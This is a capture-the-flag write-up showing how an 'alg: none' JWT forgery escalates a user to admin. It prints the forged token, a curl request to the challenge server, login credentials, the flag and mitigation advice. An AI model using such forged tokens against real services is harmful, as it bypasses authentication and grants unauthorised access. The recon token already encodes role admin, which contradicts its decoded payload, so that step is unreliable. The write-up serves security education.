# 🔐 None Shall Pass – JWT alg: none Token Forgery

**Category:** Web Security  
**Points:** 200  
**Solves:** 418

---

### 🧠 Challenge Summary
We were given access to a token-protected intranet application that issues JWTs for authentication. The objective was to bypass the role-based access control protecting the `/secret` endpoint using a low-privilege account and escalate to `admin` by forging a token.

---

### 🎯 Objective
Exploit the JWT implementation to forge a token with `role: admin` and retrieve the flag from:
```
http://34.85.163.182:8080/secret
```

---

### 🛠️ Tools & Techniques Used
- Web browser (initial login)
- JWT token decoder (jwt.io)
- Manual Base64 crafting
- `curl` for HTTP request
- Token manipulation (`alg: none` bypass)

---

### 🔍 Recon – Analyzing the JWT
After logging in with:
```
Username: agent
Password: spudpotato
```
A JWT was displayed in the UI:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.<<signature>>
```
Decoded header:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Decoded payload:
```json
{
  "user": "agent",
  "role": "user"
}
```
The algorithm used (`HS256`) implied HMAC. This presented a possible opportunity for a **JWT `alg: none`** vulnerability.

---

### 🧪 Exploitation – `alg: none` Forged JWT
Many misconfigured libraries accept tokens with `alg: none`, ignoring the signature entirely.

#### 1. Forge JWT Header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
Base64:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

#### 2. Forge JWT Payload:
```json
{
  "user": "agent",
  "role": "admin"
}
```
Base64:
```
eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ
```

#### 3. Final Token:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.
```
(Note the token ends with a period to indicate no signature.)

---

### 🚀 Final Exploit Request
Sent request with forged token:
```bash
curl http://34.85.163.182:8080/secret \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ."
```

---

### 🏁 Flag
```
C1{n0n3_4lg0_byp4ss}
```

---

### 🔒 Mitigation
- Enforce strict server-side checks for the `alg` field — only accept expected algorithms.
- Do not allow `alg: none` unless explicitly required (which is almost never the case).
- Use secure and up-to-date JWT libraries that prevent this misconfiguration.

---

